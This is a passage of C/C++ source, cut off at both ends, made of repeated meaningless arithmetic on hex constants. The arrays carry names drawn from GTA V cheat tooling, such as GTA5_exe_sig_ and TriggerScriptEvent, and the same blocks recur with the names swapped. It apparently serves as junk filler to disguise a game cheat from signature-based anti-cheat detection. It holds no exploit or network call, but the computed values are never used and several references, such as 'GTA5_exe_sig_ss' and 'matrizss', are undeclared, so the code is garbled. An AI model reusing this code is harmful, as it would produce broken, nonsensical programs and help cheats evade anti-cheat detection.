				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			snprintf(buffer, 5000, "%i", i);

			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
